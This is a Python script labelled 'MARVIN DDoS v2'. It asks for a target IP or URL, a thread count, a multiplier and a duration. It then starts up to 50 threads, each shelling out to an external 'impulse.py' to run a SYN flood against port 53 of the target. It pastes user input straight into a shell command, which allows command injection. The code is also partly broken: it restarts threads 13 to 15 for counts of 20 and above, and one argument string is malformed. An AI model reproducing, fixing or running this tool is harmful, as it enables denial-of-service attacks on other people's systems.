import os
import threading
import time
from colorama import Fore
from sys import exit
logo = """
  ███╗   ███╗ █████╗ ██████╗ ██╗   ██╗██╗███╗   ██╗
  ████╗ ████║██╔══██╗██╔══██╗██║   ██║██║████╗  ██║
  ██╔████╔██║███████║██████╔╝██║   ██║██║██╔██╗ ██║
  ██║╚██╔╝██║██╔══██║██╔══██╗╚██╗ ██╔╝██║██║╚██╗██║
  ██║ ╚═╝ ██║██║  ██║██║  ██║ ╚████╔╝ ██║██║ ╚████║
  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚═╝  ╚═══╝
  DDoS v2                                               
"""
print(Fore.RED+logo+Fore.WHITE)
ip = input(Fore.LIGHTWHITE_EX+"  IP/URL: "+Fore.WHITE)
threadcount = input(Fore.LIGHTWHITE_EX+"  Threads (1-300): "+Fore.WHITE)
count = input(Fore.LIGHTWHITE_EX+"  Multiplier: "+Fore.WHITE)
attacktime = input(Fore.LIGHTWHITE_EX+"Time (Seconds) :"+Fore.WHITE)
cont = input("  Continue?")
if cont == 'n':
    exit()
def syn():
    print(Fore.LIGHTYELLOW_EX+"  Starting SYN Attack!")
    time.sleep(2)
    os.system("python3.9 impulse.py --target "+ip+":53"+"  --time "+attacktime+"--threads "+threadcount+" --method SYN")
    try:
        """Okehhh"""
    except KeyboardInterrupt:
        os.system("clear")
        exit()
if __name__ in '__main__':
  t1 = threading.Thread(target=syn)
  t2 = threading.Thread(target=syn)
  t3 = threading.Thread(target=syn)
  t4 = threading.Thread(target=syn)
  t5 = threading.Thread(target=syn)
  t6 = threading.Thread(target=syn)
  t7 = threading.Thread(target=syn)
  t8 = threading.Thread(target=syn)
  t9 = threading.Thread(target=syn)
  t10 = threading.Thread(target=syn)
  t11 = threading.Thread(target=syn)
  t12 = threading.Thread(target=syn)
  t13 = threading.Thread(target=syn)
  t14 = threading.Thread(target=syn)
  t15 = threading.Thread(target=syn)
  t16 = threading.Thread(target=syn)
  t17 = threading.Thread(target=syn)
  t18 = threading.Thread(target=syn)
  t19 = threading.Thread(target=syn)
  t20 = threading.Thread(target=syn)
  t21 = threading.Thread(target=syn)
  t22 = threading.Thread(target=syn)
  t23 = threading.Thread(target=syn)
  t24 = threading.Thread(target=syn)
  t25 = threading.Thread(target=syn)
  t26 = threading.Thread(target=syn)
  t27 = threading.Thread(target=syn)
  t28 = threading.Thread(target=syn)
  t29 = threading.Thread(target=syn)
  t30 = threading.Thread(target=syn)
  t31 = threading.Thread(target=syn)
  t32 = threading.Thread(target=syn)
  t33 = threading.Thread(target=syn)
  t34 = threading.Thread(target=syn)
  t35 = threading.Thread(target=syn)
  t36 = threading.Thread(target=syn)
  t37 = threading.Thread(target=syn)
  t38 = threading.Thread(target=syn)
  t39 = threading.Thread(target=syn)
  t40 = threading.Thread(target=syn)
  t41 = threading.Thread(target=syn)
  t42 = threading.Thread(target=syn)
  t43 = threading.Thread(target=syn)
  t44 = threading.Thread(target=syn)
  t45 = threading.Thread(target=syn)
  t46 = threading.Thread(target=syn)
  t47 = threading.Thread(target=syn)
  t48 = threading.Thread(target=syn)
  t49 = threading.Thread(target=syn)
  t50 = threading.Thread(target=syn)
if count == '1':
  t1.start()
if count == '2':
  t1.start()
  t2.start()
if count == '3':
  t1.start()
  t2.start()
  t3.start()
if count == '4':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
if count == '5':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
if count == '6':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
if count == '7':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
if count == '8':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
if count == '9':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
if count == '10':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
if count == '11':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
if count == '12':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
if count == '13':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
if count == '14':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
if count == '15':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
if count == '16':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
if count == '17':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
if count == '18':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
if count == '19':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
if count == '20':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
if count == '21':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
if count == '22':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
if count == '23':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
if count == '24':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
if count == '25':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
if count == '26':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
if count == '27':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
if count == '28':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
if count == '29':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
if count == '30':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
if count == '31':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
if count == '32':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
if count == '33':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
if count == '34':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
if count == '35':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
if count == '36':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
if count == '37':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
if count == '38':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
if count == '39':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
if count == '40':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
if count == '41':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
if count == '42':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
if count == '43':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
if count == '44':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
if count == '45':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
if count == '46':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
if count == '47':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
if count == '48':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
  t48.start()
if count == '49':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
  t48.start()
  t49.start()
if count == '50':
  t1.start()
  t2.start()
  t3.start()
  t4.start()
  t5.start()
  t6.start()
  t7.start()
  t8.start()
  t9.start()
  t10.start()
  t11.start()
  t12.start()
  t13.start()
  t14.start()
  t15.start()
  t13.start()
  t14.start()
  t15.start()
  t16.start()
  t17.start()
  t18.start()
  t19.start()
  t20.start()
  t21.start()
  t22.start()
  t23.start()
  t24.start()
  t25.start()
  t26.start()
  t27.start()
  t28.start()
  t29.start()
  t30.start()
  t31.start()
  t32.start()
  t33.start()
  t34.start()
  t35.start()
  t36.start()
  t37.start()
  t38.start()
  t39.start()
  t40.start()
  t41.start()
  t42.start()
  t43.start()
  t44.start()
  t45.start()
  t46.start()
  t47.start()
  t48.start()
  t49.start()
  t50.start()